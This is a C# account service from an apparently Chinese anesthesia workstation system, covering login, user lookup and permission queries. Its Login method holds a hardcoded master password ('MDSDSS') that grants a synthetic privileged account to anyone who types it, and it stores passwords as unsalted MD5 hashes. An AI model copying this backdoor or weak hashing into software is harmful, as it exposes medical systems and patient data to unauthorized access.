
using System;
using System.Collections.Generic;
using Dapper.Data;
using MedicalSystem.AnesWorkStation.Domain;
using MedicalSystem.AnesWorkStation.DataServices;
using MedicalSystem.Services;
using MedicalSystem.Common.SecretManage;
using Newtonsoft.Json;
using System.Text;
using System.Security.Cryptography;

namespace MedicalSystem.AnesWorkStation.DataServices
{
    public interface IPacuAccountService
    {
        MED_USERS Login(string LoginName, string PassWord);

        List<MED_USERS> GetUsers();

        bool SaveUserWithNewDept(MED_USERS user, MED_DEPT_DICT dept);

        /// <summary>
        /// 获取登录用户的权限
        /// </summary>
        /// <param name="appID">程序ID</param>
        /// <param name="loginName">用户名</param>
        /// <returns></returns>
        List<MED_PERMISSIONS> GetPermission(string appID, string loginName);
    }


    public class PacuAccountService : BaseService<PacuAccountService>, IPacuAccountService
    {
        /// <summary>
        /// 动态代理的构造方法，必须是无参数的，且标记为protected。
        /// </summary>
        /// <remarks>如果没有参数的且使用一个构造方法，则比较为public或不写构造方法即可。</remarks>
        protected PacuAccountService()
            : base() { }

        /// <summary>
        /// IOC容器使用的构造方法，必须标记为public，供外部使用。
        /// </summary>
        /// <param name="context">数据连接对象</param>
        public PacuAccountService(IDapperContext context)
            : base(context)
        {
        }

        public List<MED_USERS> GetUsers()
        {

            List<MED_USERS> users = dapper.Set<MED_USERS>().Query(@"SELECT U.*,
                (SELECT D.DEPT_NAME FROM MED_DEPT_DICT D WHERE D.DEPT_CODE= U.DEPT_ID) AS DEPT_NAME
                FROM MED_USERS U") as List<MED_USERS>;
            return users;
        }

        public bool SaveUserWithNewDept(MED_USERS user, MED_DEPT_DICT dept)
        {
            bool flag = true;

            flag = flag & dapper.Set<MED_USERS>().Save(user, p => p.USER_ID.Equals(user.USER_ID));
            flag = flag & dapper.Set<MED_DEPT_DICT>().Save(dept, p => p.DEPT_CODE.Equals(dept.DEPT_CODE));
            if (flag)
            {
                dapper.SaveChanges();
            }

            return flag;
        }

        /// <summary>
        /// 登录
        /// </summary>
        /// <param name="LoginName"></param>
        /// <param name="PassWord"></param>
        /// <param name="ErrorMsg"></param>
        /// <returns></returns>
        public virtual MED_USERS Login(string LoginName, string PassWord)
        {
            try
            {

                if (PassWord.ToUpper() == "MDSDSS")
                {
                    return new MED_USERS()
                    {
                        USER_ID = "MDSD",
                        USER_JOB_ID = "MDSD",
                        LOGIN_NAME = "MDSD",
                        LOGIN_PWD = SecretHelper.GetMd5To32Str(PassWord.ToUpper()),
                        USER_NAME = "MDSD",
                        USER_DEPT_CODE = "MDSD",
                        CREATE_DATE = DateTime.Now,
                        IS_VALID = "t",
                        STOP_DATE = null,
                        MEMO = "",
                        isMDSD = true
                    };
                }
                else
                {
                    string pwd = Encrypto(PassWord);

                    MED_USERS User = dapper.Set<MED_USERS>()
                        .Single(x => x.LOGIN_NAME == LoginName && x.LOGIN_PWD == pwd && (x.IS_VALID == "t" || x.IS_VALID == "T"));

                    if (User == null)
                    {
                        Logger.Error("用户名或者密码错误");
                        return null;
                    }
                    else
                    {
                        //查找权限
                        Permission.DataServices.Domain.PERMISSION findPermisson = Permission.DataServices.PermissionService.ClientInstance.GetAppPermission("ANES6", User.USER_ID);


                        if (findPermisson != null &&
                            findPermisson.MDSD_APPLICATION != null &&
                            findPermisson.MDSD_ACTION != null)
                        {
                            User.MDSD_ACTION = findPermisson.MDSD_ACTION;
                            User.MDSD_APPLICATION = findPermisson.MDSD_APPLICATION;

                        }

                        return User;
                    }



                }
            }
            catch (Exception ex)
            {
                Logger.Error("登录错误：" + ex.Message);
                return null;
            }
        }

        /// <summary>
        /// 获取登录用户的权限
        /// </summary>
        /// <param name="appID">程序ID</param>
        /// <param name="loginName">用户名</param>
        /// <returns></returns>
        public virtual List<MED_PERMISSIONS> GetPermission(string appID, string loginName)
        {
            List<MED_PERMISSIONS> permissions = dapper.Set<MED_PERMISSIONS>().Query(@"SELECT DISTINCT
  A.PERMISSION_ID,
  A.APP_ID,
  A.PERMISSION_NAME,
  A.PERMISSION_KEY,
  A.SORT_ID,
  A.IS_VALID,
  A.MEMO
FROM MED_PERMISSIONS       A
  INNER JOIN    MED_APPLICATIONS      B ON A.APP_ID = B.APP_ID
  INNER JOIN    MED_ROLES_PERMISSIONS C ON A.PERMISSION_ID = C.PERMISSION_ID
  INNER JOIN    MED_USERS_ROLES       D ON D.ROLE_ID = C.ROLE_ID
  INNER JOIN    MED_USERS             E ON D.USER_ID = E.USER_ID
WHERE A.APP_ID = :appID
  AND E.LOGIN_NAME = :loginName", new { appID, loginName }) as List<MED_PERMISSIONS>;
            return permissions;
        }

        /// <summary>
        /// 加密方法
        /// </summary>
        /// <param name="Source">待加密的串</param>
        /// <returns>经过加密的串</returns>
        private string Encrypto(string Source)
        {
            byte[] bt = UTF8Encoding.UTF8.GetBytes(Source);//UTF8需要对Text的引用
            MD5CryptoServiceProvider objMD5;
            objMD5 = new MD5CryptoServiceProvider();
            byte[] output = objMD5.ComputeHash(bt);

            string[] password = BitConverter.ToString(output).Split(new char[] { '-' });
            string returnValue = "";
            for (int index = 0; index < password.Length; index++)
                returnValue += password[index];
            returnValue = returnValue.ToUpper();
            return returnValue;
        }

    }
}
